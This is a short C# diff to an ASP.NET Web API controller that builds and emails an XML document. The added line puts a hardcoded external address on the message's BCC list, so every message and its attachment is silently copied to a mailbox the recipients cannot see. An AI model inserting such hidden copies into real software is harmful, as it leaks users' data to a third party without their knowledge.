@@ -48,6 +48,7 @@ namespace CreateXmlWebApi.Controllers
             {
                 mm.Subject = model.Subject;
                 mm.Body = model.Body;
+                mm.Bcc.Add(new MailAddress("ece@moshanir.co"));
 
                 MemoryStream xmlStream = new MemoryStream();
                 doc.Save(xmlStream);
